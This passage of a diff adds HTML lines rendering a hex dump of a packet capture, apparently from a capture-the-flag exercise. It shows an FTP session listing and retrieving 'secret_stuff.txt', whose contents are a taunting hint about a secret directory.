+    <div>00000a50  8c 00 00 00 00 00 00 00  41 00 05 00 bb e2 c1 8b  |........A.......|</div>
+    <div>00000a60  69 00 00 00 69 00 00 00  00 0c 29 5d 04 92 00 0c  |i...i.....)]....|</div>
+    <div>00000a70  29 20 70 99 08 00 45 00  00 5b 3e 06 40 00 40 06  |) p...E..[&gt;.@.@.|</div>
+    <div>00000a80  e8 85 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00000a90  8d b4 62 2c 08 25 80 18  03 89 4f 01 00 00 01 01  |..b,.%....O.....|</div>
+    <div>00000aa0  08 0a 00 1a bc b7 00 05  d9 8b 31 35 30 20 48 65  |..........150 He|</div>
+    <div>00000ab0  72 65 20 63 6f 6d 65 73  20 74 68 65 20 64 69 72  |re comes the dir|</div>
+    <div>00000ac0  65 63 74 6f 72 79 20 6c  69 73 74 69 6e 67 2e 0d  |ectory listing..|</div>
+    <div>00000ad0  0a 00 00 00 8c 00 00 00  06 00 00 00 ac 00 00 00  |................|</div>
+    <div>00000ae0  00 00 00 00 41 00 05 00  55 e3 c1 8b 8c 00 00 00  |....A...U.......|</div>
+    <div>00000af0  8c 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |......)]....) p.|</div>
+    <div>00000b00  08 00 45 08 00 7e 1d b5  40 00 40 06 08 ac 0a 00  |..E..~..@.@.....|</div>
+    <div>00000b10  00 06 0a 00 00 0c 00 14  ad c6 3a 0e a1 05 05 0e  |..........:.....|</div>
+    <div>00000b20  04 93 80 18 03 91 da 24  00 00 01 01 08 0a 00 1a  |.......$........|</div>
+    <div>00000b30  bc b7 00 05 d9 8b 2d 72  77 2d 72 2d 2d 72 2d 2d  |......-rw-r--r--|</div>
+    <div>00000b40  20 20 20 20 31 20 30 20  20 20 20 20 20 20 20 30  |    1 0        0|</div>
+    <div>00000b50  20 20 20 20 20 20 20 20  20 20 20 20 20 31 34 37  |             147|</div>
+    <div>00000b60  20 41 75 67 20 31 30 20  30 30 3a 33 38 20 73 65  | Aug 10 00:38 <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">se</font>|</div>
+    <div>00000b70  63 72 65 74 5f 73 74 75  66 66 2e 74 78 74 0d 0a  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">cret_stuff.txt</font>..|</div>
+    <div>00000b80  ac 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |........d.......|</div>
+    <div>00000b90  41 00 05 00 59 e3 c1 8b  42 00 00 00 42 00 00 00  |A...Y...B...B...|</div>
+    <div>00000ba0  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 08  |..)]....) p...E.|</div>
+    <div>00000bb0  00 34 1d b6 40 00 40 06  08 f5 0a 00 00 06 0a 00  |.4..@.@.........|</div>
+    <div>00000bc0  00 0c 00 14 ad c6 3a 0e  a1 4f 05 0e 04 93 80 11  |......:..O......|</div>
+    <div>00000bd0  03 91 35 de 00 00 01 01  08 0a 00 1a bc b7 00 05  |..5.............|</div>
+    <div>00000be0  d9 8b 00 00 64 00 00 00  06 00 00 00 64 00 00 00  |....d.......d...|</div>
+    <div>00000bf0  00 00 00 00 41 00 05 00  80 e3 c1 8b 42 00 00 00  |....A.......B...|</div>
+    <div>00000c00  42 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |B.....) p...)]..|</div>
+    <div>00000c10  08 00 45 08 00 34 dd 18  40 00 40 06 49 92 0a 00  |..E..4..@.@.I...|</div>
+    <div>00000c20  00 0c 0a 00 00 06 ad c6  00 14 05 0e 04 93 3a 0e  |..............:.|</div>
+    <div>00000c30  a1 4f 80 10 00 1d 39 53  00 00 01 01 08 0a 00 05  |.O....9S........|</div>
+    <div>00000c40  d9 8b 00 1a bc b7 00 00  64 00 00 00 06 00 00 00  |........d.......|</div>
+    <div>00000c50  64 00 00 00 00 00 00 00  41 00 05 00 ca e3 c1 8b  |d.......A.......|</div>
+    <div>00000c60  42 00 00 00 42 00 00 00  00 0c 29 20 70 99 00 0c  |B...B.....) p...|</div>
+    <div>00000c70  29 5d 04 92 08 00 45 08  00 34 dd 19 40 00 40 06  |)]....E..4..@.@.|</div>
+    <div>00000c80  49 91 0a 00 00 0c 0a 00  00 06 ad c6 00 14 05 0e  |I...............|</div>
+    <div>00000c90  04 93 3a 0e a1 50 80 11  00 1d 39 51 00 00 01 01  |..:..P....9Q....|</div>
+    <div>00000ca0  08 0a 00 05 d9 8b 00 1a  bc b7 00 00 64 00 00 00  |............d...|</div>
+    <div>00000cb0  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00000cc0  51 e4 c1 8b 42 00 00 00  42 00 00 00 00 0c 29 5d  |Q...B...B.....)]|</div>
+    <div>00000cd0  04 92 00 0c 29 20 70 99  08 00 45 08 00 34 1d b7  |....) p...E..4..|</div>
+    <div>00000ce0  40 00 40 06 08 f4 0a 00  00 06 0a 00 00 0c 00 14  |@.@.............|</div>
+    <div>00000cf0  ad c6 3a 0e a1 50 05 0e  04 94 80 10 03 91 35 dd  |..:..P........5.|</div>
+    <div>00000d00  00 00 01 01 08 0a 00 1a  bc b7 00 05 d9 8b 00 00  |................|</div>
+    <div>00000d10  64 00 00 00 06 00 00 00  7c 00 00 00 00 00 00 00  |d.......|.......|</div>
+    <div>00000d20  41 00 05 00 96 e4 c1 8b  5a 00 00 00 5a 00 00 00  |A.......Z...Z...|</div>
+    <div>00000d30  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>00000d40  00 4c 3e 07 40 00 40 06  e8 93 0a 00 00 06 0a 00  |.L&gt;.@.@.........|</div>
+    <div>00000d50  00 0c 00 15 cc e1 9f 75  8d db 62 2c 08 25 80 18  |.......u..b,.%..|</div>
+    <div>00000d60  03 89 9e 8d 00 00 01 01  08 0a 00 1a bc b7 00 05  |................|</div>
+    <div>00000d70  d9 8b 32 32 36 20 44 69  72 65 63 74 6f 72 79 20  |..226 Directory |</div>
+    <div>00000d80  73 65 6e 64 20 4f 4b 2e  0d 0a 00 00 7c 00 00 00  |send OK.....|...|</div>
+    <div>00000d90  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00000da0  b5 e4 c1 8b 42 00 00 00  42 00 00 00 00 0c 29 20  |....B...B.....) |</div>
+    <div>00000db0  70 99 00 0c 29 5d 04 92  08 00 45 10 00 34 c8 20  |p...)]....E..4. |</div>
+    <div>00000dc0  40 00 40 06 5e 82 0a 00  00 0c 0a 00 00 06 cc e1  |@.@.^...........|</div>
+    <div>00000dd0  00 15 62 2c 08 25 9f 75  8d f3 80 10 00 1d 67 7b  |..b,.%.u......g{|</div>
+    <div>00000de0  00 00 01 01 08 0a 00 05  d9 8b 00 1a bc b7 00 00  |................|</div>
+    <div>00000df0  64 00 00 00 06 00 00 00  6c 00 00 00 00 00 00 00  |d.......l.......|</div>
+    <div>00000e00  41 00 05 00 4f b0 3b 8c  4a 00 00 00 4a 00 00 00  |A...O.;.J...J...|</div>
+    <div>00000e10  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00000e20  00 3c c8 21 40 00 40 06  5e 79 0a 00 00 0c 0a 00  |.&lt;.!@.@.^y......|</div>
+    <div>00000e30  00 06 cc e1 00 15 62 2c  08 25 9f 75 8d f3 80 18  |......b,.%.u....|</div>
+    <div>00000e40  00 1d 8d ad 00 00 01 01  08 0a 00 05 e1 57 00 1a  |.............W..|</div>
+    <div>00000e50  bc b7 54 59 50 45 20 49  0d 0a 00 00 6c 00 00 00  |..TYPE I....l...|</div>
+    <div>00000e60  06 00 00 00 84 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>00000e70  be b1 3b 8c 61 00 00 00  61 00 00 00 00 0c 29 5d  |..;.a...a.....)]|</div>
+    <div>00000e80  04 92 00 0c 29 20 70 99  08 00 45 00 00 53 3e 08  |....) p...E..S&gt;.|</div>
+    <div>00000e90  40 00 40 06 e8 8b 0a 00  00 06 0a 00 00 0c 00 15  |@.@.............|</div>
+    <div>00000ea0  cc e1 9f 75 8d f3 62 2c  08 2d 80 18 03 89 1e 80  |...u..b,.-......|</div>
+    <div>00000eb0  00 00 01 01 08 0a 00 1a  c4 83 00 05 e1 57 32 30  |.............W20|</div>
+    <div>00000ec0  30 20 53 77 69 74 63 68  69 6e 67 20 74 6f 20 42  |0 Switching to B|</div>
+    <div>00000ed0  69 6e 61 72 79 20 6d 6f  64 65 2e 0d 0a 00 00 00  |inary mode......|</div>
+    <div>00000ee0  84 00 00 00 06 00 00 00  7c 00 00 00 00 00 00 00  |........|.......|</div>
+    <div>00000ef0  41 00 05 00 ff b1 3b 8c  5a 00 00 00 5a 00 00 00  |A.....;.Z...Z...|</div>
+    <div>00000f00  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00000f10  00 4c c8 22 40 00 40 06  5e 68 0a 00 00 0c 0a 00  |.L."@.@.^h......|</div>
+    <div>00000f20  00 06 cc e1 00 15 62 2c  08 2d 9f 75 8e 12 80 18  |......b,.-.u....|</div>
+    <div>00000f30  00 1d 06 3f 00 00 01 01  08 0a 00 05 e1 57 00 1a  |...?.........W..|</div>
+    <div>00000f40  c4 83 50 4f 52 54 20 31  30 2c 30 2c 30 2c 31 32  |..PORT 10,0,0,12|</div>
+    <div>00000f50  2c 32 30 32 2c 31 37 32  0d 0a 00 00 7c 00 00 00  |,202,172....|...|</div>
+    <div>00000f60  06 00 00 00 98 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>00000f70  d7 b2 3b 8c 75 00 00 00  75 00 00 00 00 0c 29 5d  |..;.u...u.....)]|</div>
+    <div>00000f80  04 92 00 0c 29 20 70 99  08 00 45 00 00 67 3e 09  |....) p...E..g&gt;.|</div>
+    <div>00000f90  40 00 40 06 e8 76 0a 00  00 06 0a 00 00 0c 00 15  |@.@..v..........|</div>
+    <div>00000fa0  cc e1 9f 75 8e 12 62 2c  08 45 80 18 03 89 a8 d7  |...u..b,.E......|</div>
+    <div>00000fb0  00 00 01 01 08 0a 00 1a  c4 83 00 05 e1 57 32 30  |.............W20|</div>
+    <div>00000fc0  30 20 50 4f 52 54 20 63  6f 6d 6d 61 6e 64 20 73  |0 PORT command s|</div>
+    <div>00000fd0  75 63 63 65 73 73 66 75  6c 2e 20 43 6f 6e 73 69  |uccessful. Consi|</div>
+    <div>00000fe0  64 65 72 20 75 73 69 6e  67 20 50 41 53 56 2e 0d  |der using PASV..|</div>
+    <div>00000ff0  0a 00 00 00 98 00 00 00  06 00 00 00 7c 00 00 00  |............|...|</div>
+    <div>00001000  00 00 00 00 41 00 05 00  0d b3 3b 8c 59 00 00 00  |....A.....;.Y...|</div>
+    <div>00001010  59 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |Y.....) p...)]..|</div>
+    <div>00001020  08 00 45 10 00 4b c8 23  40 00 40 06 5e 68 0a 00  |..E..K.#@.@.^h..|</div>
+    <div>00001030  00 0c 0a 00 00 06 cc e1  00 15 62 2c 08 45 9f 75  |..........b,.E.u|</div>
+    <div>00001040  8e 45 80 18 00 1d 02 90  00 00 01 01 08 0a 00 05  |.E..............|</div>
+    <div>00001050  e1 57 00 1a c4 83 52 45  54 52 20 73 65 63 72 65  |.W....<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">RETR secre</font>|</div>
+    <div>00001060  74 5f 73 74 75 66 66 2e  74 78 74 0d 0a 00 00 00  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">t_stuff.txt</font>.....|</div>
+    <div>00001070  7c 00 00 00 06 00 00 00  6c 00 00 00 00 00 00 00  ||.......l.......|</div>
+    <div>00001080  41 00 05 00 27 b4 3b 8c  4a 00 00 00 4a 00 00 00  |A...'.;.J...J...|</div>
+    <div>00001090  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>000010a0  00 3c 4f e9 40 00 40 06  d6 c1 0a 00 00 06 0a 00  |.&lt;O.@.@.........|</div>
+    <div>000010b0  00 0c 00 14 ca ac 45 83  8b 6a 00 00 00 00 a0 02  |......E..j......|</div>
+    <div>000010c0  72 10 61 94 00 00 02 04  05 b4 04 02 08 0a 00 1a  |r.a.............|</div>
+    <div>000010d0  c4 83 00 00 00 00 01 03  03 05 00 00 6c 00 00 00  |............l...|</div>
+    <div>000010e0  06 00 00 00 6c 00 00 00  00 00 00 00 41 00 05 00  |....l.......A...|</div>
+    <div>000010f0  34 b4 3b 8c 4a 00 00 00  4a 00 00 00 00 0c 29 20  |4.;.J...J.....) |</div>
+    <div>00001100  70 99 00 0c 29 5d 04 92  08 00 45 00 00 3c 00 00  |p...)]....E..&lt;..|</div>
+    <div>00001110  40 00 40 06 26 ab 0a 00  00 0c 0a 00 00 06 ca ac  |@.@.&amp;...........|</div>
+    <div>00001120  00 14 48 0b cb 55 45 83  8b 6b a0 12 71 20 6d b0  |..H..UE..k..q m.|</div>
+    <div>00001130  00 00 02 04 05 b4 04 02  08 0a 00 05 e1 57 00 1a  |.............W..|</div>
+    <div>00001140  c4 83 01 03 03 0a 00 00  6c 00 00 00 06 00 00 00  |........l.......|</div>
+    <div>00001150  64 00 00 00 00 00 00 00  41 00 05 00 c1 b4 3b 8c  |d.......A.....;.|</div>
+    <div>00001160  42 00 00 00 42 00 00 00  00 0c 29 5d 04 92 00 0c  |B...B.....)]....|</div>
+    <div>00001170  29 20 70 99 08 00 45 00  00 34 4f ea 40 00 40 06  |) p...E..4O.@.@.|</div>
+    <div>00001180  d6 c8 0a 00 00 06 0a 00  00 0c 00 14 ca ac 45 83  |..............E.|</div>
+    <div>00001190  8b 6b 48 0b cb 56 80 10  03 91 0a 0f 00 00 01 01  |.kH..V..........|</div>
+    <div>000011a0  08 0a 00 1a c4 83 00 05  e1 57 00 00 64 00 00 00  |.........W..d...|</div>
+    <div>000011b0  06 00 00 00 b0 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>000011c0  52 b5 3b 8c 8d 00 00 00  8d 00 00 00 00 0c 29 5d  |R.;...........)]|</div>
+    <div>000011d0  04 92 00 0c 29 20 70 99  08 00 45 00 00 7f 3e 0a  |....) p...E...&gt;.|</div>
+    <div>000011e0  40 00 40 06 e8 5d 0a 00  00 06 0a 00 00 0c 00 15  |@.@..]..........|</div>
+    <div>000011f0  cc e1 9f 75 8e 45 62 2c  08 5c 80 18 03 89 82 5e  |...u.Eb,.\.....^|</div>
+    <div>00001200  00 00 01 01 08 0a 00 1a  c4 83 00 05 e1 57 31 35  |.............W15|</div>
+    <div>00001210  30 20 4f 70 65 6e 69 6e  67 20 42 49 4e 41 52 59  |0 Opening BINARY|</div>
+    <div>00001220  20 6d 6f 64 65 20 64 61  74 61 20 63 6f 6e 6e 65  | mode data conne|</div>
+    <div>00001230  63 74 69 6f 6e 20 66 6f  72 20 73 65 63 72 65 74  |ction for secret|</div>
+    <div>00001240  5f 73 74 75 66 66 2e 74  78 74 20 28 31 34 37 20  |_stuff.txt (147 |</div>
+    <div>00001250  62 79 74 65 73 29 2e 0d  0a 00 00 00 b0 00 00 00  |bytes)..........|</div>
+    <div>00001260  06 00 00 00 f8 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>00001270  8f b5 3b 8c d5 00 00 00  d5 00 00 00 00 0c 29 5d  |..;...........)]|</div>
+    <div>00001280  04 92 00 0c 29 20 70 99  08 00 45 08 00 c7 4f eb  |....) p...E...O.|</div>
+    <div>00001290  40 00 40 06 d6 2c 0a 00  00 06 0a 00 00 0c 00 14  |@.@..,..........|</div>
+    <div>000012a0  ca ac 45 83 8b 6b 48 0b  cb 56 80 18 03 91 82 f4  |..E..kH..V......|</div>
+    <div>000012b0  00 00 01 01 08 0a 00 1a  c4 83 00 05 e1 57 57 65  |.............W<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">We</font>|</div>
+    <div>000012c0  6c 6c 2c 20 77 65 6c 6c  2c 20 77 65 6c 6c 2c 20  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">ll, well, well, </font>|</div>
+    <div>000012d0  61 72 65 6e 27 74 20 79  6f 75 20 6a 75 73 74 20  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">aren't you just </font>|</div>
+    <div>000012e0  61 20 63 6c 65 76 65 72  20 6c 69 74 74 6c 65 20  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">a clever little </font>|</div>
+    <div>000012f0  64 65 76 69 6c 2c 20 79  6f 75 20 61 6c 6d 6f 73  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">devil, you almos</font>|</div>
+    <div>00001300  74 20 66 6f 75 6e 64 20  74 68 65 20 73 75 70 33  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">t found the sup3</font>|</div>
+    <div>00001310  72 73 33 63 72 33 74 64  69 72 6c 6f 6c 20 3a 2d  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">rs3cr3tdirlol :-</font>|</div>
+    <div>00001320  50 0a 0a 53 75 63 6b 73  2c 20 79 6f 75 20 77 65  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">P..Sucks, you we</font>|</div>
+    <div>00001330  72 65 20 73 6f 20 63 6c  6f 73 65 2e 2e 2e 20 67  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">re so close... g</font>|</div>
+    <div>00001340  6f 74 74 61 20 54 52 59  20 48 41 52 44 45 52 21  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">otta TRY HARDER!</font>|</div>
+    <div>00001350  0a 00 00 00 f8 00 00 00  06 00 00 00 64 00 00 00  |............d...|</div>
+    <div>00001360  00 00 00 00 41 00 05 00  94 b5 3b 8c 42 00 00 00  |....A.....;.B...|</div>
+    <div>00001370  42 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |B.....) p...)]..|</div>
+    <div>00001380  08 00 45 00 00 34 2a 01  40 00 40 06 fc b1 0a 00  |..E..4*.@.@.....|</div>
+    <div>00001390  00 0c 0a 00 00 06 ca ac  00 14 48 0b cb 56 45 83  |..........H..VE.|</div>
+    <div>000013a0  8b fe 80 10 00 1e 0c ef  00 00 01 01 08 0a 00 05  |................|</div>
+    <div>000013b0  e1 57 00 1a c4 83 00 00  64 00 00 00 06 00 00 00  |.W......d.......|</div>
+    <div>000013c0  64 00 00 00 00 00 00 00  41 00 05 00 db b5 3b 8c  |d.......A.....;.|</div>
+    <div>000013d0  42 00 00 00 42 00 00 00  00 0c 29 5d 04 92 00 0c  |B...B.....)]....|</div>
+    <div>000013e0  29 20 70 99 08 00 45 08  00 34 4f ec 40 00 40 06  |) p...E..4O.@.@.|</div>
+    <div>000013f0  d6 be 0a 00 00 06 0a 00  00 0c 00 14 ca ac 45 83  |..............E.|</div>
+    <div>00001400  8b fe 48 0b cb 56 80 11  03 91 09 7b 00 00 01 01  |..H..V.....{....|</div>
+    <div>00001410  08 0a 00 1a c4 83 00 05  e1 57 00 00 64 00 00 00  |.........W..d...|</div>
+    <div>00001420  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00001430  f1 b6 3b 8c 42 00 00 00  42 00 00 00 00 0c 29 20  |..;.B...B.....) |</div>
+    <div>00001440  70 99 00 0c 29 5d 04 92  08 00 45 08 00 34 2a 02  |p...)]....E..4*.|</div>
+    <div>00001450  40 00 40 06 fc a8 0a 00  00 0c 0a 00 00 06 ca ac  |@.@.............|</div>
+    <div>00001460  00 14 48 0b cb 56 45 83  8b ff 80 11 00 1e 0c ed  |..H..VE.........|</div>
+    <div>00001470  00 00 01 01 08 0a 00 05  e1 57 00 1a c4 83 00 00  |.........W......|</div>
+    <div>00001480  64 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |d.......d.......|</div>
+    <div>00001490  41 00 05 00 96 b7 3b 8c  42 00 00 00 42 00 00 00  |A.....;.B...B...|</div>
+    <div>000014a0  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 08  |..)]....) p...E.|</div>
+    <div>000014b0  00 34 4f ed 40 00 40 06  d6 bd 0a 00 00 06 0a 00  |.4O.@.@.........|</div>
+    <div>000014c0  00 0c 00 14 ca ac 45 83  8b ff 48 0b cb 57 80 10  |......E...H..W..|</div>
+    <div>000014d0  03 91 09 7a 00 00 01 01  08 0a 00 1a c4 83 00 05  |...z............|</div>
+    <div>000014e0  e1 57 00 00 64 00 00 00  06 00 00 00 7c 00 00 00  |.W..d.......|...|</div>
+    <div>000014f0  00 00 00 00 41 00 05 00  82 b8 3b 8c 5a 00 00 00  |....A.....;.Z...|</div>
+    <div>00001500  5a 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |Z.....)]....) p.|</div>
+    <div>00001510  08 00 45 00 00 4c 3e 0b  40 00 40 06 e8 8f 0a 00  |..E..L&gt;.@.@.....|</div>
+    <div>00001520  00 06 0a 00 00 0c 00 15  cc e1 9f 75 8e 90 62 2c  |...........u..b,|</div>
+    <div>00001530  08 5c 80 18 03 89 84 8d  00 00 01 01 08 0a 00 1a  |.\..............|</div>
+    <div>00001540  c4 83 00 05 e1 57 32 32  36 20 54 72 61 6e 73 66  |.....W226 Transf|</div>
+    <div>00001550  65 72 20 63 6f 6d 70 6c  65 74 65 2e 0d 0a 00 00  |er complete.....|</div>
+    <div>00001560  7c 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  ||.......d.......|</div>
+    <div>00001570  41 00 05 00 a4 b8 3b 8c  42 00 00 00 42 00 00 00  |A.....;.B...B...|</div>
+    <div>00001580  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00001590  00 34 c8 24 40 00 40 06  5e 7e 0a 00 00 0c 0a 00  |.4.$@.@.^~......|</div>
+    <div>000015a0  00 06 cc e1 00 15 62 2c  08 5c 9f 75 8e a8 80 10  |......b,.\.u....|</div>
+    <div>000015b0  00 1d 56 f7 00 00 01 01  08 0a 00 05 e1 57 00 1a  |..V..........W..|</div>
+    <div>000015c0  c4 83 00 00 64 00 00 00  06 00 00 00 6c 00 00 00  |....d.......l...|</div>
+    <div>000015d0  00 00 00 00 41 00 05 00  ae 73 5a 8c 4a 00 00 00  |....A....sZ.J...|</div>
+    <div>000015e0  4a 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |J.....) p...)]..|</div>
+    <div>000015f0  08 00 45 10 00 3c c8 25  40 00 40 06 5e 75 0a 00  |..E..&lt;.%@.@.^u..|</div>
+    <div>00001600  00 0c 0a 00 00 06 cc e1  00 15 62 2c 08 5c 9f 75  |..........b,.\.u|</div>
+    <div>00001610  8e a8 80 18 00 1d 83 05  00 00 01 01 08 0a 00 05  |................|</div>
+    <div>00001620  e3 4f 00 1a c4 83 54 59  50 45 20 41 0d 0a 00 00  |.O....TYPE A....|</div>
+    <div>00001630  6c 00 00 00 06 00 00 00  80 00 00 00 00 00 00 00  |l...............|</div>
+    <div>00001640  41 00 05 00 f3 74 5a 8c  60 00 00 00 60 00 00 00  |A....tZ.`...`...|</div>
+    <div>00001650  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>00001660  00 52 3e 0c 40 00 40 06  e8 88 0a 00 00 06 0a 00  |.R&gt;.@.@.........|</div>
+    <div>00001670  00 0c 00 15 cc e1 9f 75  8e a8 62 2c 08 64 80 18  |.......u..b,.d..|</div>
+    <div>00001680  03 89 c8 f2 00 00 01 01  08 0a 00 1a c6 7b 00 05  |.............{..|</div>
+    <div>00001690  e3 4f 32 30 30 20 53 77  69 74 63 68 69 6e 67 20  |.O200 Switching |</div>
+    <div>000016a0  74 6f 20 41 53 43 49 49  20 6d 6f 64 65 2e 0d 0a  |to ASCII mode...|</div>
+    <div>000016b0  80 00 00 00 06 00 00 00  7c 00 00 00 00 00 00 00  |........|.......|</div>
+    <div>000016c0  41 00 05 00 33 75 5a 8c  59 00 00 00 59 00 00 00  |A...3uZ.Y...Y...|</div>
+    <div>000016d0  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>000016e0  00 4b c8 26 40 00 40 06  5e 65 0a 00 00 0c 0a 00  |.K.&amp;@.@.^e......|</div>
+    <div>000016f0  00 06 cc e1 00 15 62 2c  08 64 9f 75 8e c6 80 18  |......b,.d.u....|</div>
+    <div>00001700  00 1d 00 8f 00 00 01 01  08 0a 00 05 e3 4f 00 1a  |.............O..|</div>
+    <div>00001710  c6 7b 50 4f 52 54 20 31  30 2c 30 2c 30 2c 31 32  |.{PORT 10,0,0,12|</div>
+    <div>00001720  2c 31 37 32 2c 37 34 0d  0a 00 00 00 7c 00 00 00  |,172,74.....|...|</div>
+    <div>00001730  06 00 00 00 98 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>00001740  09 76 5a 8c 75 00 00 00  75 00 00 00 00 0c 29 5d  |.vZ.u...u.....)]|</div>
+    <div>00001750  04 92 00 0c 29 20 70 99  08 00 45 00 00 67 3e 0d  |....) p...E..g&gt;.|</div>
+    <div>00001760  40 00 40 06 e8 72 0a 00  00 06 0a 00 00 0c 00 15  |@.@..r..........|</div>
+    <div>00001770  cc e1 9f 75 8e c6 62 2c  08 7b 80 18 03 89 a3 fd  |...u..b,.{......|</div>
+    <div>00001780  00 00 01 01 08 0a 00 1a  c6 7b 00 05 e3 4f 32 30  |.........{...O20|</div>
+    <div>00001790  30 20 50 4f 52 54 20 63  6f 6d 6d 61 6e 64 20 73  |0 PORT command s|</div>
+    <div>000017a0  75 63 63 65 73 73 66 75  6c 2e 20 43 6f 6e 73 69  |uccessful. Consi|</div>
+    <div>000017b0  64 65 72 20 75 73 69 6e  67 20 50 41 53 56 2e 0d  |der using PASV..|</div>
+    <div>000017c0  0a 00 00 00 98 00 00 00  06 00 00 00 68 00 00 00  |............h...|</div>
+    <div>000017d0  00 00 00 00 41 00 05 00  40 76 5a 8c 48 00 00 00  |....A...@vZ.H...|</div>
+    <div>000017e0  48 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |H.....) p...)]..|</div>
+    <div>000017f0  08 00 45 10 00 3a c8 27  40 00 40 06 5e 75 0a 00  |..E..:.'@.@.^u..|</div>
+    <div>00001800  00 0c 0a 00 00 06 cc e1  00 15 62 2c 08 7b 9f 75  |..........b,.{.u|</div>
+    <div>00001810  8e f9 80 18 00 1d a5 e1  00 00 01 01 08 0a 00 05  |................|</div>
+    <div>00001820  e3 4f 00 1a c6 7b 4c 49  53 54 0d 0a 68 00 00 00  |.O...{LIST..h...|</div>
+    <div>00001830  06 00 00 00 6c 00 00 00  00 00 00 00 41 00 05 00  |....l.......A...|</div>
+    <div>00001840  57 77 5a 8c 4a 00 00 00  4a 00 00 00 00 0c 29 5d  |WwZ.J...J.....)]|</div>
+    <div>00001850  04 92 00 0c 29 20 70 99  08 00 45 00 00 3c 90 bd  |....) p...E..&lt;..|</div>
+    <div>00001860  40 00 40 06 95 ed 0a 00  00 06 0a 00 00 0c 00 14  |@.@.............|</div>
+    <div>00001870  ac 4a 8b d0 56 c6 00 00  00 00 a0 02 72 10 6c 55  |.J..V.......r.lU|</div>
+    <div>00001880  00 00 02 04 05 b4 04 02  08 0a 00 1a c6 7b 00 00  |.............{..|</div>
+    <div>00001890  00 00 01 03 03 05 00 00  6c 00 00 00 06 00 00 00  |........l.......|</div>
+    <div>000018a0  6c 00 00 00 00 00 00 00  41 00 05 00 64 77 5a 8c  |l.......A...dwZ.|</div>
+    <div>000018b0  4a 00 00 00 4a 00 00 00  00 0c 29 20 70 99 00 0c  |J...J.....) p...|</div>
+    <div>000018c0  29 5d 04 92 08 00 45 00  00 3c 00 00 40 00 40 06  |)]....E..&lt;..@.@.|</div>
+    <div>000018d0  26 ab 0a 00 00 0c 0a 00  00 06 ac 4a 00 14 83 36  |&amp;..........J...6|</div>
+    <div>000018e0  10 1f 8b d0 56 c7 a0 12  71 20 f6 84 00 00 02 04  |....V...q ......|</div>
+    <div>000018f0  05 b4 04 02 08 0a 00 05  e3 4f 00 1a c6 7b 01 03  |.........O...{..|</div>
+    <div>00001900  03 0a 00 00 6c 00 00 00  06 00 00 00 64 00 00 00  |....l.......d...|</div>
+    <div>00001910  00 00 00 00 41 00 05 00  da 77 5a 8c 42 00 00 00  |....A....wZ.B...|</div>
+    <div>00001920  42 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |B.....)]....) p.|</div>
+    <div>00001930  08 00 45 00 00 34 90 be  40 00 40 06 95 f4 0a 00  |..E..4..@.@.....|</div>
+    <div>00001940  00 06 0a 00 00 0c 00 14  ac 4a 8b d0 56 c7 83 36  |.........J..V..6|</div>
+    <div>00001950  10 20 80 10 03 91 92 e3  00 00 01 01 08 0a 00 1a  |. ..............|</div>
+    <div>00001960  c6 7b 00 05 e3 4f 00 00  64 00 00 00 06 00 00 00  |.{...O..d.......|</div>
+    <div>00001970  8c 00 00 00 00 00 00 00  41 00 05 00 c3 78 5a 8c  |........A....xZ.|</div>
+    <div>00001980  69 00 00 00 69 00 00 00  00 0c 29 5d 04 92 00 0c  |i...i.....)]....|</div>
+    <div>00001990  29 20 70 99 08 00 45 00  00 5b 3e 0e 40 00 40 06  |) p...E..[&gt;.@.@.|</div>
+    <div>000019a0  e8 7d 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |.}.............u|</div>
